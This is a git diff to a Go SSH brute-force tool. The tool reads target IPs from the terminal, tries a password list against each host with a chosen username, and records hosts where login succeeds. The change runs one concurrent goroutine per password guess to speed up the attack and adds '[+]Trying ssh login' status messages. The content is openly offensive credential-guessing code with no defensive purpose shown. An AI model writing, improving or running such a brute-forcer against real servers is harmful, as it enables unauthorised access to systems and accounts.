@@ -66,6 +66,7 @@ func main() {
 	//To read the flag passwordlist
 	passwordSlice = reader(passwordList)
 	ipStatus = make(map[string]bool)
+
 	//adding scanner for reading the input from terminal
 	sc := bufio.NewScanner(os.Stdin)
 
@@ -77,24 +78,22 @@ func main() {
 				fmt.Printf("Success Login on \n%v", text)
 				break
 			} else {
-				go bruteforce(text, usr, passwordSlice)
-				if Verbose == true {
-					fmt.Printf("Trying %v, %v, %v\n", text, usr, passwordSlice)
+				for _, pwd := range passwordSlice {
+					go bruteforce(text, usr, pwd)
+					if Verbose == true {
+						fmt.Printf("[+]Trying ssh login on %v = %v:%v\n", text, usr, pwd)
 
+					}
 				}
 			}
 		}
-
 	}
 }
 
-func bruteforce(ip, user string, pass []string) {
+func bruteforce(ip, user string, pass string) {
 	//fmt.Println(pass)
 	//fmt.Printf("Trying sshing on: %v with user: %s\n", ip, user)
-
-	for _, pwd := range pass {
-		sshlogin(user, ip, pwd)
-	}
+	sshlogin(user, ip, pass)
 }
 
 //[TODO] Reading text function.
@@ -125,7 +124,8 @@ func sshlogin(user, ip, pass string) {
 	sshclient := gosshtool.NewSSHClient(sshconfig)
 	_, err := sshclient.Connect()
 	if err == nil {
-		fmt.Println("ssh successful")
+		fmt.Println("[+]ssh successful")
 		ipStatus[ip] = true
 	}
+
 }
